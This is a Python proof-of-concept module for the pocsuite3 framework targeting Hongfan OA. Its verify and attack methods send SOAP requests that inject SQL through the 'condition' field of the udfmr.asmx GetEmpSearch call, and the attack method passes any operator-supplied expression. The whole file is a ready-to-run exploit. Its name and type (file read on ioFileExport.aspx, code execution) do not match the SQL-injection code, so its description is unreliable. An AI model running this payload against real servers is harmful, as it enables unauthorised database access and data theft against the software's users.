from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict,OptString
from pocsuite3.api import get_listener_ip, get_listener_port,REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '红帆OA ioFileExport.aspx任意文件读取'
    appName = '红帆 OA'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''None'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o['command'] = OptString('',require=False)
        return o

    def _verify(self, verify=True):
        result = {}
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
        'Connection': 'close',
        'Content-Type': 'text/xml; charset=utf-8',
        'SOAPAction': '"http://tempuri.org/ioffice/udfmr/GetEmpSearch"',
        }
        data = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
<condition>1=(select @@version)</condition>
</GetEmpSearch>
</soap:Body>
</soap:Envelope>'''
        vul_url = self.url+"/iOffice/prg/set/wss/udfmr.asmx"
        resp = requests.post(vul_url,data=data,headers=headers,verify=False,timeout=10)
        if resp.status_code == 500 and "nvarchar" in resp.text and "System.Web.Services" in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['Content'] = resp.text
        return self.parse_output(result)

    def _attack(self):
        result = {}
        cmd = self.get_option('command')
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
        'Connection': 'close',
        'Content-Type': 'text/xml; charset=utf-8',
        'SOAPAction': '"http://tempuri.org/ioffice/udfmr/GetEmpSearch"',
        }
        data = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
<condition>1={}</condition>
</GetEmpSearch>
</soap:Body>
</soap:Envelope>'''.format(cmd)
        vul_url = self.url+"/iOffice/prg/set/wss/udfmr.asmx"
        resp = requests.post(vul_url,data=data,headers=headers,verify=False,timeout=10)
        if resp.status_code == 500:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['Content'] = resp.text
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
